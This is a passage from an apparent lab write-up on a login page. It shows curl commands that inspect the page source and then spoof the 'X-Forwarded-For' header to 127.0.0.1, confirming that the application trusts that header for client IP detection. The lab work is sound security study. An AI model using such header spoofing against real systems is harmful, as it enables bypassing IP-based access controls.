4. Source Code Inspection
I checked the page source:
Command:
curl http://3.253.24.120/index.php
The page contained:
<form action="index.php" method="POST">

<input type="password" name="password">
The application was using a POST parameter:
password
However, password guessing did not change the response.
________________________________________
5. Testing for IP Spoofing
Since the lab was focused on spoofing, I tested HTTP headers that can influence client IP detection.
Example:
curl -H "X-Forwarded-For: 127.0.0.1" http://3.253.24.120/index.php
The response changed:
Before:
Your IP: <real IP>
After:
Your IP: 127.0.0.1
This confirmed that the application trusted:
X-Forwarded-For
without proper validation.
